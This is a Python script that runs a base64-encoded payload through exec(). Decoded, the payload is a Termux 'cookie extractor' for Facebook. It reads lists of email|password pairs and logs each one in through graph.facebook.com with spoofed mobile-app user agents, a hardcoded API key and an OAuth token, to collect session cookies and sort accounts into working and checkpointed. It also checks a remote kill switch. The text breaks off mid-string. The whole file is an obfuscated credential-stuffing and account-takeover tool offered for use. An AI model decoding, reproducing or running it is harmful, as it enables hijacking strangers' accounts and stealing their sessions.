import base64
exec(base64.b64decode(b'IyAtKi0gY29kaW5nOiB1dGYtOCAtKi0KIyBOYW1lICAgIDogQ09PS0lFIEVYVFJBQ1RPUgojIEF1aHRvciAgOiBIQURJIEFOSEFGIEFJTUFOCiMgQ3JlYXRlICA6IDYgSmFudWFyeSAyMDI1IDEyOjI3IFBNCiMgPC0tLS0tLS0tLS0tLS0tW01BSU5dLS0tLS0tLS0tLS0tLS0+ICMKdHJ5OgogICAgaW1wb3J0IG9zLHJlLHN5cyx0aW1lCiAgICBpbXBvcnQgdXVpZCxqc29uLHN0cmluZwogICAgaW1wb3J0IHJhbmRvbSxwbGF0Zm9ybSxiczQKICAgIGltcG9ydCBzdWJwcm9jZXNzLHJlcXVlc3RzLGlvCiAgICBpbXBvcnQgYmFzZTY0LGhhc2hsaWIscHljdXJsLHNodXRpbAogICAgaW1wb3J0IHdlYmJyb3dzZXIsZGF0ZXRpbWUsdXJsbGliLHNzbAogICAgCiAgICBmcm9tIHN0cmluZyBpbXBvcnQgKgogICAgZnJvbSB0aW1lIGltcG9ydCB0aW1lCiAgICBmcm9tIGlvIGltcG9ydCBCeXRlc0lPCiAgICBmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cAogICAgZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKICAgIGZyb20gb3MgaW1wb3J0IHN5c3RlbSxwYXRoLHJlbW92ZQogICAgZnJvbSB1cmxsaWIucmVxdWVzdCBpbXBvcnQgdXJsb3BlbgpleGNlcHQgKEV4Y2VwdGlvbixNb2R1bGVOb3RGb3VuZEVycm9yKToKICAgIHByaW50KCJMb2FkaW5nIHJlcXVpcmVkIG1vZHVsZS4uLiIpCiAgICBfX2ltcG9ydF9fKCJvcyIpLnN5c3RlbSgicGlwIGluc3RhbGwgcmVxdWVzdHMgYnM0IHB5Y3VybCA+IC9kZXYvbnVsbCIpCiNfX19fX19fX19fX19fX19fX19bU0VSVkVSXV9fX19fX19fX19fX19fX18jCmRlZiBzZXJ2ZXIoKToKCSAgIHRyeToKICAgICAgICAgICAgICBkYXRhYmFzZT1yZXF1ZXN0cy5nZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQVlHSUQ5OC9GQi1Db29raWVzLS9yZWZzL2hlYWRzL21haW4vU0VSVkVSLTEudHh0IikudGV4dAoJICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoIiBJbnRlcm5ldCBFcnJvciBb4pyUXSAiKQogICAgICAgICAgICAgICAgc3lzLmV4aXQoKQoJICAgaWYgIm9uIiBpbiBkYXRhYmFzZToKCSAgICAgICB0b20oKQoJICAgZWxpZiAib2ZmIiBpbiBkYXRhYmFzZToKCQkgICAgICAgcHJpbnQoIiBb4pyUXSBUT09MIElTIE9GRiIpCgkJICAgICAgIHN5cy5leGl0KCkKCSAgIGVsc2U6CgkgICAgCSAgd2hpbGUgVHJ1ZToKCSAgIAkgICAJICAgcHJpbnQoIiBUT09MIElTIE9OIFVQREFURSIpCiIiIgp0cnk6aW1wb3J0IGJzZWN1cmUKZXhjZXB0IChJbXBvcnRFcnJvcixNb2R1bGVOb3RGb3VuZEVycm9yKToKICAgIF9faW1wb3J0X18oInN5cyIpLmV4aXQoIlVuZm9ydHVuYXRlbHkgWW91IENhbid0IFJ1biBNeSBUb29sLi4uIikKIiIiCgpiYXNlX3BhdGggPSAiL2RhdGEvZGF0YS9jb20udGVybXV4L2ZpbGVzLyIKaWYgcGF0aC5pc2ZpbGUoYmFzZV9wYXRoKyJob21lLy50ZXJtdXgvY29sb3JzLnByb3BlcnRpZXMiKSBpcyBUcnVlOgogICAgTiA9ICJceDFiWzM4OzU7MjU4bSI7UiA9ICJceDFiWzM4OzU7MTk2bSI7RyA9ICJceDFiWzM4OzU7NDZtIjtCID0gIlx4MWJbMzg7NTs0NW0iO1kgPSAiXHgxYlszODs1OzE1NG0iO0kgPSAiXHgxYlszODs1OzEyN20iO1MgPSAiXHgxYlszODs1OzgxbSI7VyA9ICJceDFiWzM4OzU7MjU2bSI7UCA9ICJceDFiWzM4OzU7MjAzbSIKZWxzZToKICAgIE4gPSAiXHgxYls5MG0iO1IgPSAiXHgxYls5MW0iO0cgPSAiXHgxYls5Mm0iO1kgPSAiXHgxYls5M20iO0IgPSAiXHgxYls5NG0iO0kgPSAiXHgxYls5NW0iO1MgPSAiXHgxYls5Nm0iO1cgPSAiXHgxYls5N20iO1AgPSAiXHgxYlszODs1OzIwM20iCgpkYXRhYmFzZSA9IHsiMSI6ICJKYW51YXJ5IiwgIjIiOiAiRmVicnVhcnkiLCAiMyI6ICJNYXJjaCIsICI0IjogIkFwcmlsIiwgIjUiOiAiTWF5IiwgIjYiOiAiSnVuZSIsICI3IjogIkp1bHkiLCAiOCI6ICJBdWd1c3QiLCAiOSI6ICJTZXB0ZW1iZXIiLCAiMTAiOiAiT2N0b2JlciIsICIxMSI6ICJOb3ZlbWJlciIsICIxMiI6ICJEZWNlbWJlciJ9CmRheSA9IGRhdGV0aW1lLm5vdygpLmRheQptb250aCA9IGRhdGFiYXNlW3N0cihkYXRldGltZS5ub3coKS5tb250aCldCnllYXIgPSBkYXRldGltZS5ub3coKS55ZWFyCgpzeXMuc3Rkb3V0LndyaXRlKCdceDFiXTI7IE1SLUJBWUdJRCBceDA3JykKdUlEID0gaGFzaGxpYi5tZDUoKHBsYXRmb3JtLnZlcnNpb24oKStzdHIob3MuZ2V0dWlkKCkpK3BsYXRmb3JtLnBsYXRmb3JtKCkrb3MuZ2V0bG9naW4oKStwbGF0Zm9ybS5yZWxlYXNlKCkpLnJlcGxhY2UoJyAnLCcnKS5lbmNvZGUoKSkuaGV4ZGlnZXN0KCkudXBwZXIoKQoKY2xhc3MgY29raUV4dHJhY3RvcjoKICAgIGRlZiBfX2luaXRfXyhzZWxmKToKICAgICAgICBzZWxmLlggPSBmIiB7V31be0d9K3tXfV0iCiAgICAgICAgc2VsZi5saW5leCA9IGxhbWJkYTpwcmludChmIntZfeKAontXfeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgXtZfeKAoiIpCiAgICAgICAgc2VsZi5ib3ggPSBsYW1iZGEgVGV4dDpmIiB7V31be0d9e1RleHR9e1d9XSIKICAgICAgICBzZWxmLnBhdGggPSAiL3NkY2FyZC9NUi1CQVlHSUQiCiAgICAgICAgc2VsZi52ZXJpb24gPSAiMS4xIgogICAgICAgIHNlbGYudHlwZSA9ICJQRVJTT05BTCIKICAgIAogICAgZGVmIGJhbm5lcihzZWxmKToKICAgICAgICBpZiBzeXMucGxhdGZvcm0ubG93ZXIoKSA9PSAid2luIjpzeXN0ZW0oImNscyIpCiAgICAgICAgZWxpZiBzeXMucGxhdGZvcm0ubG93ZXIoKSA9PSAibGludXgiOnN5c3RlbSgiY2xlYXIiKQogICAgICAgIGVsc2U6ZXhpdCgpCiAgICAgICAgcHJpbnQoZiIiIgogIHtXfSA4ODg4ODg4ODg4IDg4ODg4OGIuICBZODhiICAgZDg4UCAKICB7R30gODg4ICAgICAgICA4ODggICI4OGIgIFk4OGIgZDg4UCAgCiAge1d9IDg4OCAgICAgICAgODg4ICAuODhQICAgWTg4bzg4UCAgIAogIHtHfSA4ODg4ODg4ICAgIDg4ODg4ODhLLiAgICBZODg4UCAgICAKICB7V30gODg4ICAgICAgICA4ODggICJZODhiICAgZDg4OGIgICAgCiAge0d9IDg4OCAgICAgICAgODg4ICAgIDg4OCAgZDg4ODg4YiAgIAogIHtXfSA4ODggICAgICAgIDg4OCAgIGQ4OFAgZDg4UCBZODhiICAKICB7R30gODg4ICAgICAgICA4ODg4ODg4UCIgZDg4UCAgIFk4OGIgCntZfeKAontXfeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgeKUgXtZfeKAogoge1d9W3tHfSt7V31dIEZBQ0VCT09LICB7Un0te0d9IEJBWUdJRAoge1d9W3tHfSt7V31dIFZFUlNJT04gIHtSfS17R30ge3NlbGYudmVyaW9ufSB7V30tPiB7Qn17c2VsZi50eXBlfQoge1d9W3tHfSt7V31dIERFVkVMT1BFUiB7Un0te0d9IEJBWUdJRCBIQVNTQU4Ke1l94oCie1d94pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSBe1l94oCiIiIiKQogICAgCiAgICBkZWYgbWFpbihzZWxmKToKICAgICAgICBzZWxmLmJhbm5lcigpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5ib3goJzEnKX0gU1RBUlQgRVhUUkFDVE9SIikKICAgICAgICBwcmludChmIntzZWxmLmJveCgnMicpfSBKT0lOIFRFTEVHUkFNIikKICAgICAgICBwcmludChmIntzZWxmLmJveCgnMycpfSBGT0xMT1cgRkFDRUJPT0siKQogICAgICAgIHByaW50KGYie3NlbGYuYm94KCc0Jyl9IEVYSVQgPHtSfS97V30+IikKICAgICAgICBzZWxmLmxpbmV4KCkKICAgICAgICBzZWxmLnNlbGVjdCA9IGlucHV0KGYie3NlbGYuWH0gU0VMRUNUICA6LXtHfSAiKQogICAgICAgIGlmIHNlbGYuc2VsZWN0ID09ICIxIjpzZWxmLmRldGFjdF9tZXRob2QoKQogICAgICAgIGVsaWYgc2VsZi5zZWxlY3QgPT0gIjIiOnN5c3RlbSgieGRnLW9wZW4gaHR0cHM6Ly90Lm1lL2JheWdpZGhvc3Nlbjk4NyIpO3NlbGYubWFpbigpCiAgICAgICAgZWxpZiBzZWxmLnNlbGVjdCA9PSAiMyI6c3lzdGVtKCJ4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vbWQuYmF5Z2lkLjE0MjgiKTtzZWxmLm1haW4oKQogICAgICAgIGVsaWYgc2VsZi5zZWxlY3QgPT0gIjQiOnByaW50KGYie3NlbGYuWH0gVEhBTktTIEZPUiBVU0lORyBNWSBUT09MIik7c3lzLmV4aXQoc2VsZi5saW5leCgpKQogICAgICAgIGVsc2U6c2VsZi5tYWluKCkKICAgIAogICAgZGVmIGRldGFjdF9tZXRob2Qoc2VsZik6CiAgICAgICAgc2VsZi5iYW5uZXIoKQogICAgICAgIHByaW50KGYie3NlbGYuYm94KCcxJyl9IE1FVEhPRCBBUEkgKEZBU1QpIikKICAgICAgICBwcmludChmIntzZWxmLmJveCgnMicpfSBNRVRIT0QgQVBJIChTTE9XKSIpCiAgICAgICAgc2VsZi5saW5leCgpCiAgICAgICAgc2VsZi5zZWxlY3QgPSBpbnB1dChmIntzZWxmLlh9IFNFTEVDVCAgOi17R30gIikKICAgICAgICBpZiBzZWxmLnNlbGVjdCA9PSAiMSI6QXBpU3lzdGVtKHNlbGYpLm1haW4obWV0aG9kPTEpCiAgICAgICAgZWxpZiBzZWxmLnNlbGVjdCA9PSAiMiI6QXBpU3lzdGVtKHNlbGYpLm1haW4obWV0aG9kPTIpCiAgICAgICAgZWxzZTpBcGlTeXN0ZW0oc2VsZikubWFpbihtZXRob2Q9MSkKCmNsYXNzIEFwaVN5c3RlbToKICAgIGRlZiBfX2luaXRfXyhzZWxmLG9yZ2luKToKICAgICAgICBzZWxmLlggPSBvcmdpbgogICAgICAgIHNlbGYuc2F2ZSA9IFtdCiAgICAgICAgc2VsZi5sb29wID0gMAogICAgICAgIHNlbGYub2tzID0gW10KICAgICAgICBzZWxmLmNwcyA9IFtdCiAgICAgICAgc2VsZi5lcnMgPSBbXQogICAgCiAgICBkZWYgdWdlbkEoc2VsZik6CiAgICAgICAgdWExID0gIltGQkFOL0ZCNEE7RkJBVi8yNzQuMC4wLjQ2LjExOTtGQkJWLzIxOTIzNzQ3ODtGQkRNL3tkZW5zaXR5PTMuMCx3aWR0aD0xMDgwLGhlaWdodD0yMTkyfTtGQkxDL2VuX1VTO0ZCUlYvMjIwNzI1OTU4O0ZCQ1IvVmVyaXpvbiA7RkJNRi9tb3Rvcm9sYTtGQkJEL21vdG9yb2xhO0ZCUE4vY29tLmZhY2Vib29rLmthdGFuYTtGQkRWL21vdG8gejQ7RkJTVi8xMDtGQk9QLzE7RkJDQS9hcm02NC12OGE6O10iCiAgICAgICAgdWEyID0gIltGQkFOL0ZCNEE7RkJBVi8yNzYuMC4wLjQ0LjEyNztGQkJWLzIyNTEyOTM4NztGQkRNL3tkZW5zaXR5PTQuNSx3aWR0aD0xNDQwLGhlaWdodD0yNzQ0fTtGQkxDL2VuX1VTO0ZCUlYvMjI3OTg5MjE4O0ZCQ1IvVmVyaXpvbiA7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9TTS1HOTY1VTtGQlNWLzEwO0ZCT1AvMTtGQkNBL2FybTY0LXY4YTo7XSIKICAgICAgICB1YTMgPSAiW0ZCQU4vRkI0QTtGQkFWLzI3OC4wLjAuNTEuMTE5O0ZCQlYvMjI5MjgxNzgyO0ZCRE0ve2RlbnNpdHk9Mi42MjUsd2lkdGg9MTA4MCxoZWlnaHQ9MjA3NX07RkJMQy9lbl9VUztGQlJWLzIzMDYyNDM5MDtGQkNSL0JpdGU7RkJNRi9PbmVQbHVzO0ZCQkQvT25lUGx1cztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9PTkVQTFVTIEE2MDAzO0ZCU1YvMTA7RkJPUC8xO0ZCQ0EvYXJtNjQtdjhhOjtdIgogICAgICAgIHVhNCA9ICJbRkJBTi9GQjRBO0ZCQVYvMjY0LjAuMC40NC4xMTE7RkJCVi8yMDY2MzY2OTM7RkJETS97ZGVuc2l0eT0yLjc1LHdpZHRoPTEwODAsaGVpZ2h0PTE5MjB9O0ZCTEMvZW5fVVM7RkJSVi8yMDg1NDE3Mjg7RkJDUi9Uc2VsLURpUnVtYWhBamE7RkJNRi9YaWFvbWk7RkJCRC9YaWFvbWk7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvTUkgTUFYIDI7RkJTVi83LjEuMTtGQk9QLzE7RkJDQS9hcm1lYWJpLXY3YTphcm1lYWJpO10iCiAgICAgICAgbWF4ID0gcmFuZG9tLmNob2ljZShbdWExLHVhMix1YTMsdWE0XSkKICAgICAgICByZXR1cm4gc3RyKG1heCkKICAgIAogICAgZGVmIHVnZW5CKHNlbGYpOgogICAgICAgIHVhMSA9ICJbRkJBTi9GQjRBO0ZCQVYvMjY2LjAuMC42NC4xMjQ7RkJCVi8yMDk2MjkzNzQ7RkJETS97ZGVuc2l0eT0zLjM3NSx3aWR0aD0xMDgwLGhlaWdodD0yMDU4fTtGQkxDL2VuX1VTO0ZCUlYvMjEwNTYxNDIwO0ZCQ1IvQVQmYW1wLVQ7RkJNRi9zYW1zdW5nO0ZCQkQvc2Ftc3VuZztGQlBOL2NvbS5mYWNlYm9vay5rYXRhbmE7RkJEVi9TTS1HODkyQTtGQlNWLzk7RkJPUC8xOTtGQkNBL2FybTY0LXY4YTo7XSIKICAgICAgICB1YTIgPSAiW0ZCQU4vRkI0QTtGQkFWLzI2Ni4wLjAuNjQuMTI0O0ZCQlYvMjA5NjI5MzcyO0ZCRE0ve2RlbnNpdHk9Mi42MjUsd2lkdGg9MTA4MCxoZWlnaHQ9MjA2NH07RkJMQy9lbl9VUztGQlJWLzIxMDY1ODQ0ODtGQkNSL1NwZWN0cnVtO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvU00tTjk3MFU7RkJTVi8xMDtGQk9QLzE5O0ZCQ0EvYXJtNjQtdjhhOjtdIgogICAgICAgIHVhMyA9ICJbRkJBTi9GQjRBO0ZCQVYvMjY4LjAuMC43LjEyMTtGQkJWLzIxMDM3NTgwNDtGQkRNL3tkZW5zaXR5PTIuNjI1LHdpZHRoPTEwODAsaGVpZ2h0PTIwNjl9O0ZCTEMvZW5fVVM7RkJSVi8wO0ZCQ1IvU3ByaW50O0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvU00tTjk3NVU7RkJTVi8xMDtGQk9QLzE5O0ZCQ0EvYXJtNjQtdjhhOjtdIgogICAgICAgIHVhNCA9ICJbRkJBTi9GQjRBO0ZCQVYvMjY2LjAuMC42NC4xMjQ7RkJCVi8yMDk2MjkzNzQ7RkJETS97ZGVuc2l0eT00LjAsd2lkdGg9MTQ0MCxoZWlnaHQ9Mjc2OH07RkJMQy9lbl9VUztGQlJWLzIxMDc5NjUzMjtGQkNSL1JlcHVibGljO0ZCTUYvc2Ftc3VuZztGQkJEL3NhbXN1bmc7RkJQTi9jb20uZmFjZWJvb2sua2F0YW5hO0ZCRFYvU00tRzk2MFUxO0ZCU1YvMTA7RkJPUC8xOTtGQkNBL2FybTY0LXY4YTo7XSIKICAgICAgICBtYXggPSByYW5kb20uY2hvaWNlKFt1YTEsdWEyLHVhMyx1YTRdKQogICAgICAgIHJldHVybiBzdHIobWF4KQogICAgCiAgICBkZWYgbWFpbihzZWxmLG1ldGhvZCk6CiAgICAgICAgc2VsZi5YLmJhbm5lcigpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLlh9IFlPVVIgRklMRSBGT1JNQVQgPyIpCiAgICAgICAgc2VsZi5YLmxpbmV4KCkKICAgICAgICBwcmludChmIntzZWxmLlguYm94KCcxJyl9IFVJRHxQQVNTIikKICAgICAgICBwcmludChmIntzZWxmLlguYm94KCcyJyl9IFVJRHxQQVNTfENPT0tJRSIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLmJveCgnMycpfSBFTUFJTHxQQVNTIikKICAgICAgICBwcmludChmIntzZWxmLlguYm94KCc0Jyl9IEVNQUlMfFBBU1N8Q09PS0lFIikKICAgICAgICBzZWxmLlgubGluZXgoKQogICAgICAgIHNlbGYuYXdtID0gaW5wdXQoZiJ7c2VsZi5YLlh9IFNFTEVDVCA6LXtHfSAiKTtzZWxmLlgubGluZXgoKQogICAgICAgIGlmIHNlbGYuYXdtID09ICIxIjpzZWxmLm1haWxwYXNzKG1ldGhvZCkKICAgICAgICBlbGlmIHNlbGYuYXdtID09ICIyIjpzZWxmLm1haWxwYXNzY29raWUobWV0aG9kKQogICAgICAgIGVsaWYgc2VsZi5hd20gPT0gIjMiOnNlbGYubWFpbHBhc3MobWV0aG9kKQogICAgICAgIGVsaWYgc2VsZi5hd20gPT0gIjQiOnNlbGYubWFpbHBhc3Njb2tpZShtZXRob2QpCiAgICAgICAgZWxzZTpzZWxmLm1haW4obWV0aG9kKQogICAgCiAgICBkZWYgbWFpbHBhc3Moc2VsZixtZXRob2QpOgogICAgICAgIHNlbGYuWC5iYW5uZXIoKQogICAgICAgIHNlbGYuZmlsZSA9IGlucHV0KGYie3NlbGYuWC5YfSBGSUxFIFBBVEggOi0gIikKICAgICAgICB0cnk6c2VsZi5maWxlcyA9IG9wZW4oc2VsZi5maWxlLCJyIikucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpzZWxmLm1haWxwYXNzKG1ldGhvZCkKICAgICAgICBzZWxmLlgubGluZXgoKQogICAgICAgIHByaW50KGYie3NlbGYuWC5YfSBTQVZFIEZJTEUgRk9STUFUID8iKQogICAgICAgIHNlbGYuWC5saW5leCgpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLmJveCgnMScpfSBVSUR8UEFTUyIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLmJveCgnMicpfSBVSUR8UEFTU3xDT09LSUUiKQogICAgICAgIHByaW50KGYie3NlbGYuWC5ib3goJzMnKX0gVUlEfEVNQUlMfFBBU1N8Q09PS0lFIikKICAgICAgICBzZWxmLlgubGluZXgoKQogICAgICAgIHNlbGYuYXdtID0gaW5wdXQoZiJ7c2VsZi5YLlh9IFNFTEVDVCA6LXtHfSAiKTtzZWxmLlgubGluZXgoKQogICAgICAgIGlmIHNlbGYuYXdtID09ICIxIjpzZWxmLnNhdmUuYXBwZW5kKCJBIikKICAgICAgICBlbGlmIHNlbGYuYXdtID09ICIyIjpzZWxmLnNhdmUuYXBwZW5kKCJCIikKICAgICAgICBlbGlmIHNlbGYuYXdtID09ICIzIjpzZWxmLnNhdmUuYXBwZW5kKCJDIikKICAgICAgICBzZWxmLlguYmFubmVyKCkKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgSURTIDotIHtHfXtzdHIobGVuKHNlbGYuZmlsZXMpKX0iKQogICAgICAgIHByaW50KGYie3NlbGYuWC5YfSBQUk9DQ0VTUyBIQVMgQkVFTiBTVEFSVEVELi4uLiIpCiAgICAgICAgc2VsZi5YLmxpbmV4KCkKICAgICAgICBmb3IgdXNlcnMgaW4gc2VsZi5maWxlczoKICAgICAgICAgICAgZW1haWwscGFzc3dvcmQgPSB1c2Vycy5zcGxpdCgifCIpCiAgICAgICAgICAgIGlmIG1ldGhvZCA9PSAxOnNlbGYuYXBpbWV0aG9kQShlbWFpbCxwYXNzd29yZCkKICAgICAgICAgICAgZWxpZiBtZXRob2QgPT0gMjpzZWxmLmFwaW1ldGhvZEIoZW1haWwscGFzc3dvcmQpCiAgICAgICAgICAgIGVsc2U6c2VsZi5hcGltZXRob2RBKGVtYWlsLHBhc3N3b3JkKQogICAgICAgIAogICAgICAgIHByaW50KCJcbiIpCiAgICAgICAgc2VsZi5YLmxpbmV4KCkKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgT0tTIDotIHtHfXtzdHIobGVuKHNlbGYub2tzKSl9IikKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgQ1BTIDotIHtSfXtzdHIobGVuKHNlbGYuY3BzKSl9IikKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgRVJTIDotIHtZfXtzdHIobGVuKHNlbGYuZXJzKSl9IikKICAgICAgICBzeXMuZXhpdChzZWxmLlgubGluZXgoKSkKICAgIAogICAgZGVmIG1haWxwYXNzY29raWUoc2VsZixtZXRob2QpOgogICAgICAgIHNlbGYuWC5iYW5uZXIoKQogICAgICAgIHNlbGYuZmlsZSA9IGlucHV0KGYie3NlbGYuWC5YfSBGSUxFIFBBVEggOi0gIikKICAgICAgICB0cnk6c2VsZi5maWxlcyA9IG9wZW4oc2VsZi5maWxlLCJyIikucmVhZCgpLnNwbGl0bGluZXMoKQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjpzZWxmLm1haWxwYXNzY29raWUobWV0aG9kKQogICAgICAgIHNlbGYuWC5saW5leCgpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLlh9IFNBVkUgRklMRSBGT1JNQVQgPyIpCiAgICAgICAgc2VsZi5YLmxpbmV4KCkKICAgICAgICBwcmludChmIntzZWxmLlguYm94KCcxJyl9IFVJRHxQQVNTIikKICAgICAgICBwcmludChmIntzZWxmLlguYm94KCcyJyl9IFVJRHxQQVNTfENPT0tJRSIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLmJveCgnMycpfSBVSUR8RU1BSUx8UEFTU3xDT09LSUUiKQogICAgICAgIHNlbGYuWC5saW5leCgpCiAgICAgICAgc2VsZi5hd20gPSBpbnB1dChmIntzZWxmLlguWH0gU0VMRUNUIDote0d9ICIpO3NlbGYuWC5saW5leCgpCiAgICAgICAgaWYgc2VsZi5hd20gPT0gIjEiOnNlbGYuc2F2ZS5hcHBlbmQoIkEiKQogICAgICAgIGVsaWYgc2VsZi5hd20gPT0gIjIiOnNlbGYuc2F2ZS5hcHBlbmQoIkIiKQogICAgICAgIGVsaWYgc2VsZi5hd20gPT0gIjMiOnNlbGYuc2F2ZS5hcHBlbmQoIkMiKQogICAgICAgIHNlbGYuWC5iYW5uZXIoKQogICAgICAgIHByaW50KGYie3NlbGYuWC5YfSBUT1RBTCBJRFMgOi0ge0d9e3N0cihsZW4oc2VsZi5maWxlcykpfSIpCiAgICAgICAgcHJpbnQoZiJ7c2VsZi5YLlh9IFBST0NDRVNTIEhBUyBCRUVOIFNUQVJURUQuLi4uIikKICAgICAgICBzZWxmLlgubGluZXgoKQogICAgICAgIGZvciB1c2VycyBpbiBzZWxmLmZpbGVzOgogICAgICAgICAgICBlbWFpbCxwYXNzd29yZCxjb29raWUgPSB1c2Vycy5zcGxpdCgifCIpCiAgICAgICAgICAgIGlmIG1ldGhvZCA9PSAxOnNlbGYuYXBpbWV0aG9kQShlbWFpbCxwYXNzd29yZCkKICAgICAgICAgICAgZWxpZiBtZXRob2QgPT0gMjpzZWxmLmFwaW1ldGhvZEIoZW1haWwscGFzc3dvcmQpCiAgICAgICAgICAgIGVsc2U6c2VsZi5hcGltZXRob2RBKGVtYWlsLHBhc3N3b3JkKQogICAgICAgIAogICAgICAgIHByaW50KCJcbiIpCiAgICAgICAgc2VsZi5YLmxpbmV4KCkKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgT0tTIDotIHtHfXtzdHIobGVuKHNlbGYub2tzKSl9IikKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgQ1BTIDotIHtSfXtzdHIobGVuKHNlbGYuY3BzKSl9IikKICAgICAgICBwcmludChmIntzZWxmLlguWH0gVE9UQUwgRVJTIDotIHtZfXtzdHIobGVuKHNlbGYuZXJzKSl9IikKICAgICAgICBzeXMuZXhpdChzZWxmLlgubGluZXgoKSkKICAgIAogICAgZGVmIGFwaW1ldGhvZEEoc2VsZixlbWFpbCxwYXNzd29yZCk6CiAgICAgICAgZ2xvYmFsIGxvb3Asb2tzLGNwcwogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoZiJcciB7V31bRkJYLVhEXSB7c2VsZi5sb29wfXxNMXxPS1M6LXtHfXtsZW4oc2VsZi5va3MpfVxyIikKICAgICAgICBzeXMuc3Rkb3V0LmZsdXNoKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHNlc3Npb246CiAgICAgICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgJ2FkaWQnOnN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICAgICAgICAgJ2VtYWlsJzplbWFpbCwKICAgICAgICAgICAgICAgICdwYXNzd29yZCc6cGFzc3dvcmQsCiAgICAgICAgICAgICAgICAnY3BsJzondHJ1ZScsCiAgICAgICAgICAgICAgICAnY3JlZGVudGlhbHNfdHlwZSc6J2RldmljZV9iYXNlZF9sb2dpbl9wYXNzd29yZCcsCiAgICAgICAgICAgICAgICAic291cmNlIjogImRldmljZV9iYXNlZF9sb2dpbiIsCiAgICAgICAgICAgICAgICAnZXJyb3JfZGV0YWlsX3R5cGUnOididXR0b25fd2l0aF9kaXNhYmxlZCcsCiAgICAgICAgICAgICAgICAnZm9ybWF0JzonanNvbicsCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfc2Vzc2lvbl9jb29raWVzJzonMScsCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfYW5hbHl0aWNzX2NsYWltJzonMScsCiAgICAgICAgICAgICAgICAnZ2VuZXJhdGVfbWFjaGluZV9pZCc6JzEnLAogICAgICAgICAgICAgICAgImZhbWlseV9kZXZpY2VfaWQiOiBzdHIodXVpZC51dWlkNCgpKSwKICAgICAgICAgICAgICAgICJhZHZlcnRpc2VyX2lkIjogc3RyKHV1aWQudXVpZDQoKSksCiAgICAgICAgICAgICAgICAibG9jYWxlIjoiZW5fVVMiLCJjbGllbnRfY291bnRyeV9jb2RlIjoiVVMiLAogICAgICAgICAgICAgICAgImRldmljZV9pZCI6IHN0cih1dWlkLnV1aWQ0KCkpLAogICAgICAgICAgICAgICAgIm1ldGhvZCI6ICJhdXRoLmxvZ2luIiwKICAgICAgICAgICAgICAgICJhcGlfa2V5IjogIjg4MmE4NDkwMzYxZGE5ODcwMmJmOTdhMDIxZGRjMTRkIiwKICAgICAgICAgICAgICAgICJmYl9hcGlfcmVxX2ZyaWVuZGx5X25hbWUiOiAiYXV0aGVudGljYXRlIiwKICAgICAgICAgICAgICAgICJmYl9hcGlfY2FsbGVyX2NsYXNzIjogImNvbS5mYWNlYm9vay5hY2NvdW50LmxvZ2luLnByb3RvY29sLkZiNGFBdXRoSGFuZGxlciJ9CiAgICAgICAgICAgICAgICBoZWFkZXIgPSB7CiAgICAgICAgICAgICAgICAnY29udGVudC10eXBlJzonYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJywKICAgICAgICAgICAgICAgICdIb3N0JzogJ2dyYXBoLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICAgICAneC1mYi1zaW0taG5pJzpzdHIocmFuZG9tLnJhbmRpbnQoMjAwMDAsNDAwMDApKSwKICAgICAgICAgICAgICAgICdYLUZCLUNvbm5lY3Rpb24tVHlwZSc6ICdNT0JJTEUuTFRFJywKICAgICAgICAgICAgICAgICdBdXRob3JpemF0aW9uJzonT0F1dGggMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQz